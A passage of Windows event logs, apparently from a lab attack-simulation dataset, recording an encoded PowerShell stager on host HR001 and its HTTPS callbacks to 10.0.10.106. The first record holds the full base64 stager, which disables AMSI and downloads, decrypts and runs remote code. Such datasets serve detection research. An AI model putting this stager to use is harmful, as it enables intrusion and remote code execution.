AGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71029\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\""},"opcode":"To be used when operation is just executing a method","provider_guid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","user":{"identifier":"S-1-5-21-2511471446-1103646877-3980648787-1106","name":"nmartha","domain":"SHIRE","type":"User"},"record_number":"92781","process_id":5452}
{"@timestamp":"2019-05-18T20:43:09.144Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"source_name":"Microsoft-Windows-Sysmon","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"event_data":{"DestinationIp":"10.0.10.106","DestinationPortName":"https","Protocol":"tcp","UtcTime":"2019-05-07 11:56:25.980","DestinationPort":"443","Initiated":"true","SourceIsIpv6":"false","ProcessId":"5172","DestinationIsIpv6":"false","SourceIp":"172.18.39.106","ProcessGuid":"{03ba39f5-4cfe-5ce0-0000-00103600c001}","SourceHostname":"HR001.shire.com","SourcePort":"53372","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","User":"SHIRE\\nmartha"},"message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:25.980\nProcessGuid: {03ba39f5-4cfe-5ce0-0000-00103600c001}\nProcessId: 5172\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53372\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","opcode":"Info","host":{"name":"WECserver"},"version":5,"event_id":3,"log_name":"Microsoft-Windows-Sysmon/Operational","computer_name":"HR001.shire.com","level":"Information","type":"wineventlog","record_number":"2237798","process_id":2440,"beat":{"version":"6.7.0","name":"WECserver","hostname":"WECserver"},"task":"Network connection detected (rule: NetworkConnect)","thread_id":2368,"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}
{"@timestamp":"2019-05-18T20:43:09.259Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2019-05-18 20:43:09.222\nProcessGuid: {03ba39f5-50b2-5ce0-0000-00109995c501}\nProcessId: 5452\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"event_data":{"ProcessId":"5452","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"HKU\\S-1-5-21-2511471446-1103646877-3980648787-1106\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections","EventType":"CreateKey","UtcTime":"2019-05-18 20:43:09.222","ProcessGuid":"{03ba39f5-50b2-5ce0-0000-00109995c501}"},"event_id":12,"thread_id":3144,"opcode":"Info","log_name":"Microsoft-Windows-Sysmon/Operational","process_id":2440,"level":"Information","beat":{"hostname":"WECserver","version":"6.7.0","name":"WECserver"},"type":"wineventlog","task":"Registry object added or deleted (rule: RegistryEvent)","source_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","computer_name":"HR001.shire.com","record_number":"2237799","version":2,"host":{"name":"WECserver"}}
{"@timestamp":"2019-05-18T20:43:09.237Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"thread_id":6364,"event_id":5156,"level":"Information","task":"Filtering Platform Connection","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"host":{"name":"WECserver"},"type":"wineventlog","record_number":"288252","keywords":["Audit Success"],"opcode":"Info","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","event_data":{"Application":"\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe","FilterRTID":"67557","ProcessID":"5452","DestAddress":"10.0.10.106","LayerName":"%%14611","RemoteUserID":"S-1-0-0","RemoteMachineID":"S-1-0-0","SourcePort":"53374","DestPort":"443","LayerRTID":"48","Direction":"%%14593","SourceAddress":"172.18.39.106","Protocol":"6"},"source_name":"Microsoft-Windows-Security-Auditing","message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t5452\n\tApplication Name:\t\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.106\n\tSource Port:\t\t53374\n\tDestination Address:\t10.0.10.106\n\tDestination Port:\t\t443\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67557\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","process_id":4,"version":1,"log_name":"Security","computer_name":"HR001.shire.com"}
{"@timestamp":"2019-05-18T20:43:10.159Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"task":"Network connection detected (rule: NetworkConnect)","message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:26.847\nProcessGuid: {03ba39f5-652c-5ce0-0000-0010760bff01}\nProcessId: 7924\nImage: C:\\Windows\\System32\\notepad.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53373\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","event_data":{"ProcessGuid":"{03ba39f5-652c-5ce0-0000-0010760bff01}","DestinationIp":"10.0.10.106","SourceIp":"172.18.39.106","Initiated":"true","SourceIsIpv6":"false","DestinationPortName":"https","ProcessId":"7924","SourceHostname":"HR001.shire.com","User":"SHIRE\\nmartha","DestinationIsIpv6":"false","UtcTime":"2019-05-07 11:56:26.847","Image":"C:\\Windows\\System32\\notepad.exe","SourcePort":"53373","Protocol":"tcp","DestinationPort":"443"},"process_id":2440,"thread_id":2368,"version":5,"computer_name":"HR001.shire.com","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"record_number":"2237800","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","type":"wineventlog","log_name":"Microsoft-Windows-Sysmon/Operational","source_name":"Microsoft-Windows-Sysmon","event_id":3,"level":"Information","opcode":"Info","host":{"name":"WECserver"}}
{"@timestamp":"2019-05-18T20:43:10.425Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"event_data":{"Protocol":"tcp","SourceIsIpv6":"false","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourcePort":"53374","SourceIp":"172.18.39.106","SourceHostname":"HR001.shire.com","Initiated":"true","DestinationIsIpv6":"false","DestinationPortName":"https","DestinationPort":"443","ProcessGuid":"{03ba39f5-50b2-5ce0-0000-00109995c501}","ProcessId":"5452","User":"SHIRE\\nmartha","DestinationIp":"10.0.10.106","UtcTime":"2019-05-07 11:56:27.104"},"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"source_name":"Microsoft-Windows-Sysmon","version":5,"process_id":2440,"thread_id":2368,"record_number":"2237801","host":{"name":"WECserver"},"log_name":"Microsoft-Windows-Sysmon/Operational","level":"Information","opcode":"Info","event_id":3,"message":"Network connection detected:\nRuleName: \nUtcTime: 2019-05-07 11:56:27.104\nProcessGuid: {03ba39f5-50b2-5ce0-0000-00109995c501}\nProcessId: 5452\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nUser: SHIRE\\nmartha\nProtocol: tcp\nInitiated: true\nSourceIsIpv6: false\nSourceIp: 172.18.39.106\nSourceHostname: HR001.shire.com\nSourcePort: 53374\nSourcePortName: \nDestinationIsIpv6: false\nDestinationIp: 10.0.10.106\nDestinationHostname: \nDestinationPort: 443\nDestinationPortName: https","type":"wineventlog","user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"},"computer_name":"HR001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","task":"Network connection detected (rule: NetworkConnect)"}
{"@timestamp":"2019-05-18T20:43:11.474Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"version":2,"level":"Information","event_id":11,"beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"message":"File created:\nRuleName: \nUtcTime: 2019-05-18 20:43:11.473\nProcessGuid: {905CC552-2042-5CC5-0000-00103D150100}\nProcessId: 976\nImage: C:\\Windows\\System32\\svchost.exe\nTargetFilename: C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\lastalive1.dat\nCreationUtcTime: 2019-04-28 03:43:03.134","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"record_number":"5402619","event_data":{"TargetFilename":"C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\lastalive1.dat","CreationUtcTime":"2019-04-28 03:43:03.134","UtcTime":"2019-05-18 20:43:11.473","ProcessGuid":"{905CC552-2042-5CC5-0000-00103D150100}","ProcessId":"976","Image":"C:\\Windows\\System32\\svchost.exe"},"source_name":"Microsoft-Windows-Sysmon","computer_name":"HFDC01.shire.com","host":{"name":"WECserver"},"process_id":1368,"thread_id":2860,"opcode":"Info","log_name":"Microsoft-Windows-Sysmon/Operational","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","type":"wineventlog","task":"File created (rule: FileCreate)"}
